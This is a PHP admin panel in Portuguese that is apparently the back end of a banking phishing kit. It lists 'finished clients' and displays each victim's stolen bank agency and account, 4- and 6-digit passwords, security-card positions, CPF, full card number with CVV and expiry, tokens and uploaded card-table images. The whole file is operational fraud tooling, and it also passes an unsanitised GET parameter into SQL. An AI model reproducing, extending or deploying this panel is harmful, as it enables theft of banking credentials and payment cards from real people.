<?php 

if(isset($_GET['view']) && $_GET['view'] != ''):
	$ShowInfo = 'block';
	$UserId = $_GET['view'];

	$tabela = 'acessos';
	$cond = "WHERE status = '1' AND id = '$UserId'";
	$ListCliente = read($conn, $tabela, $cond);
else:
	$ShowInfo = 'none';
endif;


?>
<h1 style="font-size:2.5em;color:#fff;text-align:center;">
	<i class="fa fa-cogs"></i> &nbsp;Lista de Clientes Finalizados.
</h1>
<table width="100%" border="0" cellspacing="5" cellpadding="5" class="table_lista_clientes">
	<thead>
		<tr>
			<td>IP:</td>
			<td>Data:</td>
			<td>Tipo:</td>
			<td>Tabela Full:</td>
			<td>CC Full:</td>
			<td>Anotação:</td>
			<td>Visualizar:</td>
		</tr>
	</thead>
	<tbody>
<?php 

$tabela = 'acessos';
$cond = "WHERE status = '1'";
$GetClientes = read($conn, $tabela, $cond);

if(!$GetClientes):
	echo 'Ainda sem nada';
else:
	for($i = 0;$i < count($GetClientes);$i++){
		if($GetClientes[$i]['tipo_acesso'] == 'D. Fisico' || $GetClientes[$i]['tipo_acesso'] == 'M. Fisico'):
?>
		<tr>
			<td><?= $GetClientes[$i]['ip'];?></td>
			<td><?= date('d/m/y H:i', strtotime($GetClientes[$i]['data_acesso']));?></td>
			<td><?= $GetClientes[$i]['tipo_acesso'];?></td>
			<td><?= ($GetClientes[$i]['enviou_tabela'] == '1') ? 'SIM' : 'NAO';?></td>
			<td><?= ($GetClientes[$i]['cc_numero'] != '') ? 'SIM' : 'NAO';?></td>
			<td><?= $GetClientes[$i]['anotacao'];?></td>
			<td><a href="acesso.php?pag=lista-infos&view=<?= $GetClientes[$i]['id'];?>" class="manage_user_link"><i class="fa fa-eye"></i></a></td>
		</tr>
<?php
		endif;
	}
endif;
?>
	</tbody>
</table>	

<div class="gerenciamento" style="position: absolute!important;top:0;left:0;display:<?= $ShowInfo;?>;">
	<div class="block_commands" style="width:80%;">
		<div class="block_show_infos">
			<span>ID: <b><?= $ListCliente[0]['id'];?></b> / <b><?= $ListCliente[0]['ip'];?></b></span>
			<span>STATUS: <b><?= ($ListCliente[0]['status'] == 1) ? 'FINALIZADO' : 'NÃO FINALIZADO';?></span>
			<span>HOST NAME: <b><?= $ListCliente[0]['pc_name'];?></b></span>
			<span>OS: <b><?= $ListCliente[0]['sistema_operacional'];?></b> / <b><?= $ListCliente[0]['browser_name'];?></b> - <b><?= $ListCliente[0]['browser_version'];?></b></span>
			<span>NOME: <b><?= $ListCliente[0]['nome'];?></b></span>
			<span>DATA: <b><?= date('d/m/Y H:s' ,strtotime($ListCliente[0]['data_acesso']));?></b></span>

			<span>ENDEREÇO: <b><?= $ListCliente[0]['cidade'];?></b> / <b><?= $ListCliente[0]['estado'];?></b> / <b><?= $ListCliente[0]['pais'];?></b></span>
			<span>TIPO ACESSO: <b><?= $ListCliente[0]['tipo_acesso'];?></b></span>

			<span>ACESSO: <b><?= $ListCliente[0]['agencia'];?></b> / <b><?= $ListCliente[0]['conta'];?></b>-<b><?= $ListCliente[0]['digito'];?></b></span>
			<span>SENHA 4 / 6: <b><?= $ListCliente[0]['senha_4'];?></b> / <b><?= $ListCliente[0]['pass_6'];?></b></span>
			<span>POSIÇÃO: <b><?= $ListCliente[0]['tabela_pos'];?></b> - <b><?= $ListCliente[0]['tabela_valor'];?></b></span>
			<span>CPF: <b><?= $ListCliente[0]['cpf'];?></b></span>

			<span>CC NOME: <b><?= $ListCliente[0]['cc_nome'];?></b></span>
			<span>CC NUMERO: <b><?= $ListCliente[0]['cc_numero'];?></b></span>
			<span>CC VALIDADE: <b><?= $ListCliente[0]['cc_val'];?></b></span>
			<span>CC CÓDIGO: <b><?= $ListCliente[0]['cc_cvv'];?></b></span>

			<span>TOKEN: <b><?= $ListCliente[0]['token'];?></b></span>
			
			<span>ANOTAÇÃO: <b><?= $ListCliente[0]['anotacao'];?></b></span>
			<div class="clear"></div>
		</div><!-- block_show_infos -->
		<div class="block_show_infos">
			<?php 

				if($ListCliente[0]['tipo_acesso'] == 'M. Fisico'):
			?>
			<div class="block_buttons_atrib">
				<a href="#" class="show_buttons_atrib" onclick="document.getElementById('show_img_comp').style.display = 'block';document.getElementById('cc_one').style.display = 'none';">Ver TABELA</a>
				<a href="#" class="show_buttons_atrib" onclick="document.getElementById('cc_one').style.display = 'block';document.getElementById('show_img_comp').style.display = 'none';">Ver CC</a>
			</div>
				<div id="show_img_comp">
					<img src="../_images/comprovantes/<?= $ListCliente[0]['comprovante_patch'];?>">
				</div> 
				<div id="cc_one">
					<span><y>Titular:</y> <b><?= $ListCliente[0]['cc_nome'];?></b></span>
					<span><y>Número CC:</y> <b><?= $ListCliente[0]['cc_numero'];?></b></span>
					<span><y>Validade:</y> <b><?= $ListCliente[0]['cc_val'];?></b></span>
					<span><y>Código de Segurança:</y> <b><?= $ListCliente[0]['cc_cvv'];?></b></span>
				</div>
			</span>

			<?php 

				elseif($ListCliente[0]['tipo_acesso'] == 'JUBA CERT' || $ListCliente[0]['tipo_acesso'] == 'JUBA USER' || $ListCliente[0]['tipo_acesso'] == 'JUBA CERT HSBC'):
			?>

				
			<?php 
				else:
					$tabelaTable = 'tabela_usuarios';
					$condTable = "WHERE id_user = '$UserId'";
					$GetTables = read($conn, $tabelaTable, $condTable);
			?>
				<div class="block_buttons_atrib">
					<a href="#" class="show_buttons_atrib" onclick="document.getElementById('cc_one').style.display = 'none';document.getElementById('tabela_one').style.display = 'block';">Ver TABELA</a>
					<a href="#" class="show_buttons_atrib" onclick="document.getElementById('cc_one').style.display = 'block';document.getElementById('tabela_one').style.display = 'none';">Ver CC</a>
				</div>

				<div id="cc_one">
					<span><y>Titular:</y> <b><?= $ListCliente[0]['cc_nome'];?></b></span>
					<span><y>Número CC:</y> <b><?= $ListCliente[0]['cc_numero'];?></b></span>
					<span><y>Validade:</y> <b><?= $ListCliente[0]['cc_val'];?></b></span>
					<span><y>Código de Segurança:</y> <b><?= $ListCliente[0]['cc_cvv'];?></b></span>
				</div>

				<table width="447" border="0" id="tabela_one">
					
					<tbody>
						<tr>
							<td class="redtextsmall">01</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos01'];?>" name="input1" id="input1"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input2.focus(); }">
							</td>
							<td class="redtextsmall">11</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos11'];?>" name="input11" id="input11"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input12.focus(); }">
							</td>
							<td class="redtextsmall">21</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos21'];?>" name="input21" id="input21"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input22.focus(); }">
							</td>
							<td class="redtextsmall">31</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos31'];?>" name="input31" id="input31"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input32.focus(); }">
							</td>
							<td class="redtextsmall">41</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos41'];?>" name="input41" id="input41"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input42.focus(); }">
							</td>
							<td class="redtextsmall">51</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos51'];?>" name="input51" id="input51"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input52.focus(); }">
							</td>
							<td class="redtextsmall">61</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos61'];?>" name="input61" id="input61"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input62.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">02</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos02'];?>" name="input2" id="input2"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input3.focus(); }">
							</td>
							<td class="redtextsmall">12</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos12'];?>" name="input12" id="input12"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input13.focus(); }">
							</td>
							<td class="redtextsmall">22</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos22'];?>" name="input22" id="input22"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input23.focus(); }">
							</td>
							<td class="redtextsmall">32</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos32'];?>" name="input32" id="input32"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input33.focus(); }">
							</td>
							<td class="redtextsmall">42</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos42'];?>" name="input42" id="input42"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input43.focus(); }">
							</td>
							<td class="redtextsmall">52</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos52'];?>" name="input52" id="input52"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input53.focus(); }">
							</td>
							<td class="redtextsmall">62</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos62'];?>" name="input62" id="input62"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input63.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">03</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos03'];?>" name="input3" id="input3"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input4.focus(); }">
							</td>
							<td class="redtextsmall">13</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos13'];?>" name="input13" id="input13"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input14.focus(); }">
							</td>
							<td class="redtextsmall">23</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos23'];?>" name="input23" id="input23"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input24.focus(); }">
							</td>
							<td class="redtextsmall">33</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos33'];?>" name="input33" id="input33"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input34.focus(); }">
							</td>
							<td class="redtextsmall">43</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos43'];?>" name="input43" id="input43"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input44.focus(); }">
							</td>
							<td class="redtextsmall">53</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos53'];?>" name="input53" id="input53">
							</td>
							<td class="redtextsmall">63</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos63'];?>" name="input63" id="input63">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">04</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos04'];?>" name="input4" id="input4">
							</td>
							<td class="redtextsmall">14</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos14'];?>" name="input14" id="input14">
							</td>
							<td class="redtextsmall">24</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos24'];?>" name="input24" id="input24">
							</td>
							<td class="redtextsmall">34</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos34'];?>" name="input34" id="input34">
							</td>
							<td class="redtextsmall">44</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos44'];?>" name="input44" id="input44">
							</td>
							<td class="redtextsmall">54</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos54'];?>" name="input54" id="input54">
							</td>
							<td class="redtextsmall">64</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos64'];?>" name="input64" id="input64">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">05</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos05'];?>" name="input5" id="input5">
							</td>
							<td class="redtextsmall">15</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos15'];?>" name="input15" id="input15">
							</td>
							<td class="redtextsmall">25</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos25'];?>" name="input25" id="input25">
							</td>
							<td class="redtextsmall">35</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos35'];?>" name="input35" id="input35">
							</td>
							<td class="redtextsmall">45</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos45'];?>" name="input45" id="input45">
							</td>
							<td class="redtextsmall">55</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos55'];?>" name="input55" id="input55">
							</td>
							<td class="redtextsmall">65</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos65'];?>" name="input65" id="input65">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">06</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos06'];?>" name="input6" id="input6">
							</td>
							<td class="redtextsmall">16</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos16'];?>" name="input16" id="input16">
							</td>
							<td class="redtextsmall">26</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos26'];?>" name="input26" id="input26">
							</td>
							<td class="redtextsmall">36</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos36'];?>" name="input36" id="input36">
							</td>
							<td class="redtextsmall">46</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos46'];?>" name="input46" id="input46">
							</td>
							<td class="redtextsmall">56</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos56'];?>" name="input56" id="input56">
							</td>
							<td class="redtextsmall">66</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos66'];?>" name="input66" id="input66">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">07</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos07'];?>" name="input7" id="input7">
							</td>
							<td class="redtextsmall">17</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos17'];?>" name="input17" id="input17">
							</td>
							<td class="redtextsmall">27</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos27'];?>" name="input27" id="input27">
							</td>
							<td class="redtextsmall">37</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos37'];?>" name="input37" id="input37">
							</td>
							<td class="redtextsmall">47</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos47'];?>" name="input47" id="input47">
							</td>
							<td class="redtextsmall">57</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos57'];?>" name="input57" id="input57">
							</td>
							<td class="redtextsmall">67</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos67'];?>" name="input67" id="input67">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">08</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos08'];?>" name="input8" id="input8">
							</td>
							<td class="redtextsmall">18</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos18'];?>" name="input18" id="input18">
							</td>
							<td class="redtextsmall">28</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos28'];?>" name="input28" id="input28">
							</td>
							<td class="redtextsmall">38</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos38'];?>" name="input38" id="input38">
							</td>
							<td class="redtextsmall">48</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos48'];?>" name="input48" id="input48">
							</td>
							<td class="redtextsmall">58</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos58'];?>" name="input58" id="input58">
							</td>
							<td class="redtextsmall">68</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos68'];?>" name="input68" id="input68">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">09</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos09'];?>" name="input9" id="input9">
							</td>
							<td class="redtextsmall">19</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos19'];?>" name="input19" id="input19">
							</td>
							<td class="redtextsmall">29</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos29'];?>" name="input29" id="input29">
							</td>
							<td class="redtextsmall">39</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos39'];?>" name="input39" id="input39"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input40.focus(); }">
							</td>
							<td class="redtextsmall">49</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos49'];?>" name="input49" id="input49"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input50.focus(); }">
							</td>
							<td class="redtextsmall">59</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos59'];?>" name="input59" id="input59"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input60.focus(); }">
							</td>
							<td class="redtextsmall">69</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos69'];?>" name="input69" id="input69"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input70.focus(); }">
							</td>
						</tr>
						<tr>
							<td class="redtextsmall">10</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos10'];?>" name="input10" id="input10"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input11.focus(); }">
							</td>
							<td class="redtextsmall">20</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos20'];?>" name="input20" id="input20"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input21.focus(); }">
							</td>
							<td class="redtextsmall">30</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos30'];?>" name="input30" id="input30"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input31.focus(); }">
							</td>
							<td class="redtextsmall">40</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos40'];?>" name="input40" id="input40"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input41.focus(); }">
							</td>
							<td class="redtextsmall">50</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos50'];?>" name="input50" id="input50"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input51.focus(); }">
							</td>
							<td class="redtextsmall">60</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos60'];?>" name="input60" id="input60"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { input61.focus(); }">
							</td>
							<td class="redtextsmall">70</td>
							<td>
								<input type="text" readonly class="input_tabelaone" value="<?php echo $GetTables[0]['pos70'];?>" name="input70" id="input70"  onkeypress="return SomenteNumero(event)" onkeyup="if(this.value.length >= 3) { referencia.focus(); }">
							</td>
						</tr>
						<tr>
							<td colspan="8"></td>
							<td colspan="6"></td>
						</tr>
						<tr>
							<td height="37" colspan="10"><br>Referência: <input type="text" readonly class="input_referencia" value="<?php echo $GetTables[0]['tabela_referencia'];?>" name="referencia" id="referencia" class="input_ref" maxlength="11" onkeypress="return SomenteNumero(event)" autocomplete="off"></td>
							<td colspan="4"></span>
							</td>
						</tr>
					</tbody>
				</table>
			<?php 
				endif;
			?>
		</div><!-- block_show_infos -->
		<div class="clear"></div>
		<br><br>
		<a href="acesso.php?pag=lista-infos" class="btn_close_now">FECHAR</a>
		<div class="clear"></div>
	</div>
</div>